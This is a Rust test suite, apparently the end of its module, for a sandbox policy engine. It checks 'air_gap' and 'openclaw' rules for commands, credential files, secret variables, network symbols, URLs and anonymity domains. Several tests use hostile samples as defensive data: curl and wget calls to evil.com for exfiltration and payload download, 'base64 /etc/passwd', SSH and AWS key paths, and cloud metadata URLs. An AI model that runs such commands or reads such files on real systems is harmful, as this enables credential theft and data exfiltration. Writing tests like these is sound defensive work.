    fn test_air_gap_allows_non_network_commands() {
        let engine = air_gap_engine();

        let d = engine.evaluate_execution("ls -la");
        assert_eq!(d.action, PolicyAction::Allow);

        let d = engine.evaluate_execution("cat /etc/hostname");
        assert_eq!(d.action, PolicyAction::Allow);

        let d = engine.evaluate_execution("echo hello");
        assert_eq!(d.action, PolicyAction::Allow);
    }

    #[test]
    fn test_air_gap_base_files_present() {
        let engine = air_gap_engine();

        let d = engine.evaluate_file("~/.ssh/id_rsa", Operation::Read);
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_file("~/.aws/credentials", Operation::Read);
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_file("/tmp/server.pem", Operation::Read);
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_air_gap_base_envvars_present() {
        let engine = air_gap_engine();

        let d = engine.evaluate_envvar("AWS_SECRET_ACCESS_KEY");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_envvar("GITHUB_TOKEN");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_envvar("DYLD_INSERT_LIBRARIES");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_envvar("HOME");
        assert_eq!(d.action, PolicyAction::Allow);
    }

    #[test]
    fn test_air_gap_base_symbols_present() {
        let engine = air_gap_engine();

        let d = engine.evaluate_native_function("getpass", &[]);
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_native_function("crypt", &[]);
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_native_function("socket", &[]);
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_native_function("connect", &[]);
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_native_function("sendto", &[]);
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_native_function("getaddrinfo", &[]);
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_native_function("bind", &[]);
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_native_function("syscall", &[]);
        assert_eq!(d.action, PolicyAction::Deny);
    }

    // =====================================================================
    // openclaw detection + policy tests
    // =====================================================================

    fn openclaw_engine() -> PolicyEngine {
        let yaml = embedded_policy("openclaw").expect("openclaw policy must exist");
        PolicyEngine::from_yaml_with_includes(&yaml, &|name| embedded_policy(name))
            .expect("openclaw policy must parse")
    }

    #[test]
    fn test_openclaw_policy_parses() {
        let engine = openclaw_engine();
        assert!(engine.policy().iter_sections().count() > 0);
    }

    #[test]
    fn test_openclaw_nodejs_eval_blocked() {
        let engine = openclaw_engine();

        let d = engine.evaluate_function(Runtime::Node, "eval", &[]);
        assert_eq!(d.action, PolicyAction::Deny);
        assert_eq!(d.section_mode(), EnforcementMode::Block);

        let d = engine.evaluate_function(Runtime::Node, "vm.runInContext", &[]);
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_function(Runtime::Node, "vm.compileFunction", &[]);
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_function(Runtime::Node, "child_process.exec", &[]);
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_function(Runtime::Node, "child_process.execSync", &[]);
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_openclaw_nodejs_networking_allowed() {
        let engine = openclaw_engine();

        let d = engine.evaluate_function(Runtime::Node, "net.connect", &[]);
        assert_eq!(d.action, PolicyAction::Allow);

        let d = engine.evaluate_function(Runtime::Node, "net.createServer", &[]);
        assert_eq!(d.action, PolicyAction::Allow);

        let d = engine.evaluate_function(Runtime::Node, "http.createServer", &[]);
        assert_eq!(d.action, PolicyAction::Allow);

        let d = engine.evaluate_function(Runtime::Node, "fetch", &[]);
        assert_eq!(d.action, PolicyAction::Allow);
    }

    #[test]
    fn test_openclaw_commands_blocked() {
        let engine = openclaw_engine();

        let d = engine.evaluate_execution("curl https://evil.com/exfil");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_execution("wget https://evil.com/payload");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_execution("python3 -c 'import os'");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_execution("perl -e 'system(\"ls\")'");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_execution("base64 /etc/passwd");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_execution("crontab -e");
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_openclaw_commands_allowed() {
        let engine = openclaw_engine();

        let d = engine.evaluate_execution("node server.js");
        assert_eq!(d.action, PolicyAction::Allow);

        let d = engine.evaluate_execution("git status");
        assert_eq!(d.action, PolicyAction::Allow);

        let d = engine.evaluate_execution("npm install express");
        assert_eq!(d.action, PolicyAction::Allow);

        let d = engine.evaluate_execution("docker run nginx");
        assert_eq!(d.action, PolicyAction::Allow);

        let d = engine.evaluate_execution("ssh user@gateway.example.com");
        assert_eq!(d.action, PolicyAction::Allow);

        let d = engine.evaluate_execution("ffmpeg -i input.ogg output.mp3");
        assert_eq!(d.action, PolicyAction::Allow);
    }

    #[test]
    fn test_openclaw_commands_warned() {
        let engine = openclaw_engine();

        let d = engine.evaluate_execution("sh -c 'echo hello'");
        assert_eq!(d.action, PolicyAction::Deny);
        assert_eq!(d.section_mode(), EnforcementMode::Warn);

        let d = engine.evaluate_execution("bash -c 'echo hello'");
        assert_eq!(d.action, PolicyAction::Deny);
        assert_eq!(d.section_mode(), EnforcementMode::Warn);
    }

    #[test]
    fn test_openclaw_commands_reviewed() {
        let engine = openclaw_engine();

        let d = engine.evaluate_execution("sudo coredns");
        assert_eq!(d.action, PolicyAction::Deny);
        assert_eq!(d.section_mode(), EnforcementMode::Review);
    }

    #[test]
    fn test_openclaw_cloud_metadata_blocked() {
        let engine = openclaw_engine();

        let d = engine.evaluate_http_url(
            "http://169.254.169.254/latest/meta-data/",
            "169.254.169.254/latest/meta-data/",
        );
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_http_url(
            "http://metadata.google.internal/computeMetadata/v1/",
            "metadata.google.internal/computeMetadata/v1/",
        );
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_openclaw_ai_and_chat_apis_allowed() {
        let engine = openclaw_engine();

        let d = engine.evaluate_http_url(
            "https://api.anthropic.com/v1/messages",
            "api.anthropic.com/v1/messages",
        );
        assert_eq!(d.action, PolicyAction::Allow);

        let d = engine.evaluate_http_url(
            "https://api.openai.com/v1/chat/completions",
            "api.openai.com/v1/chat/completions",
        );
        assert_eq!(d.action, PolicyAction::Allow);

        let d = engine.evaluate_http_url(
            "https://slack.com/api/chat.postMessage",
            "slack.com/api/chat.postMessage",
        );
        assert_eq!(d.action, PolicyAction::Allow);

        let d = engine.evaluate_http_url(
            "https://api.telegram.org/bot123/sendMessage",
            "api.telegram.org/bot123/sendMessage",
        );
        assert_eq!(d.action, PolicyAction::Allow);

        let d = engine.evaluate_http_url(
            "https://discord.com/api/v10/channels/123/messages",
            "discord.com/api/v10/channels/123/messages",
        );
        assert_eq!(d.action, PolicyAction::Allow);
    }

    #[test]
    fn test_openclaw_localhost_allowed() {
        let engine = openclaw_engine();

        let d = engine.evaluate_http_url("http://127.0.0.1:3000/health", "127.0.0.1:3000/health");
        assert_eq!(d.action, PolicyAction::Allow);

        let d = engine.evaluate_http_url("http://localhost:8080/api", "localhost:8080/api");
        assert_eq!(d.action, PolicyAction::Allow);
    }

    #[test]
    fn test_openclaw_unlisted_domains_denied() {
        let engine = openclaw_engine();

        let d = engine.evaluate_http_url("https://evil.com/exfil", "evil.com/exfil");
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_openclaw_protocols_restricted() {
        let engine = openclaw_engine();

        assert_eq!(
            engine.evaluate_protocol("https").action,
            PolicyAction::Allow
        );
        assert_eq!(engine.evaluate_protocol("http").action, PolicyAction::Allow);
        assert_eq!(engine.evaluate_protocol("wss").action, PolicyAction::Allow);
        assert_eq!(engine.evaluate_protocol("ws").action, PolicyAction::Allow);

        assert_eq!(engine.evaluate_protocol("tcp").action, PolicyAction::Deny);
        assert_eq!(engine.evaluate_protocol("udp").action, PolicyAction::Deny);
    }

    #[test]
    fn test_openclaw_credential_files_blocked() {
        let engine = openclaw_engine();

        let d = engine.evaluate_file("~/.ssh/id_rsa", Operation::Read);
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_file("~/.aws/credentials", Operation::Read);
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_file("/tmp/server.pem", Operation::Read);
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_file("/home/user/.ssh/id_ed25519", Operation::Read);
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_file("/tmp/config.json", Operation::Read);
        assert_eq!(d.action, PolicyAction::Allow);
    }

    #[test]
    fn test_openclaw_hard_secrets_blocked() {
        let engine = openclaw_engine();

        let d = engine.evaluate_envvar("MY_SECRET");
        assert_eq!(d.action, PolicyAction::Deny);
        assert_eq!(d.section_mode(), EnforcementMode::Block);

        let d = engine.evaluate_envvar("AWS_ACCESS_KEY_ID");
        assert_eq!(d.action, PolicyAction::Deny);
        assert_eq!(d.section_mode(), EnforcementMode::Block);

        let d = engine.evaluate_envvar("GITHUB_TOKEN");
        assert_eq!(d.action, PolicyAction::Deny);
        assert_eq!(d.section_mode(), EnforcementMode::Block);
    }

    #[test]
    fn test_openclaw_legitimate_keys_warned() {
        let engine = openclaw_engine();

        let d = engine.evaluate_envvar("OPENAI_API_KEY");
        assert_eq!(d.action, PolicyAction::Deny);
        assert_eq!(d.section_mode(), EnforcementMode::Warn);

        let d = engine.evaluate_envvar("ANTHROPIC_API_KEY");
        assert_eq!(d.action, PolicyAction::Deny);
        assert_eq!(d.section_mode(), EnforcementMode::Warn);

        let d = engine.evaluate_envvar("CLAUDE_API_KEY");
        assert_eq!(d.action, PolicyAction::Deny);
        assert_eq!(d.section_mode(), EnforcementMode::Warn);

        let d = engine.evaluate_envvar("OPENCLAW_PORT");
        assert_eq!(d.action, PolicyAction::Deny);
        assert_eq!(d.section_mode(), EnforcementMode::Warn);

        let d = engine.evaluate_envvar("HF_TOKEN");
        assert_eq!(d.action, PolicyAction::Deny);
        assert_eq!(d.section_mode(), EnforcementMode::Warn);
    }

    #[test]
    fn test_openclaw_normal_envvars_allowed() {
        let engine = openclaw_engine();

        let d = engine.evaluate_envvar("HOME");
        assert_eq!(d.action, PolicyAction::Allow);

        let d = engine.evaluate_envvar("PATH");
        assert_eq!(d.action, PolicyAction::Allow);

        let d = engine.evaluate_envvar("NODE_ENV");
        assert_eq!(d.action, PolicyAction::Allow);
    }

    #[test]
    fn test_openclaw_anti_tracing_blocked() {
        let engine = openclaw_engine();

        let d = engine.evaluate_envvar("DYLD_INSERT_LIBRARIES");
        assert_eq!(d.action, PolicyAction::Deny);
        assert_eq!(d.section_mode(), EnforcementMode::Block);

        let d = engine.evaluate_envvar("LD_PRELOAD");
        assert_eq!(d.action, PolicyAction::Deny);
        assert_eq!(d.section_mode(), EnforcementMode::Block);
    }

    #[test]
    fn test_openclaw_native_getpass_blocked() {
        let engine = openclaw_engine();

        let d = engine.evaluate_native_function("getpass", &[]);
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_native_function("crypt", &[]);
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_openclaw_blocks_network_symbols() {
        let engine = openclaw_engine();

        for sym in &["connect", "socket", "sendto", "bind"] {
            let d = engine.evaluate_native_function(sym, &[]);
            assert_eq!(d.action, PolicyAction::Deny, "{} should be denied", sym);
        }
    }

    #[test]
    fn test_openclaw_blocks_filesystem_bypass_symbols() {
        let engine = openclaw_engine();

        for sym in &["symlink", "link", "syscall"] {
            let d = engine.evaluate_native_function(sym, &[]);
            assert_eq!(d.action, PolicyAction::Deny, "{} should be denied", sym);
        }
    }

    #[test]
    fn test_openclaw_anonymity_domains_warned() {
        let engine = openclaw_engine();

        let d = engine.evaluate_domain("hidden.onion");
        assert_eq!(d.action, PolicyAction::Deny);
        assert_eq!(d.section_mode(), EnforcementMode::Warn);

        let d = engine.evaluate_domain("service.i2p");
        assert_eq!(d.action, PolicyAction::Deny);
        assert_eq!(d.section_mode(), EnforcementMode::Warn);

        let d = engine.evaluate_domain("tunnel.loki");
        assert_eq!(d.action, PolicyAction::Deny);
        assert_eq!(d.section_mode(), EnforcementMode::Warn);
    }
}
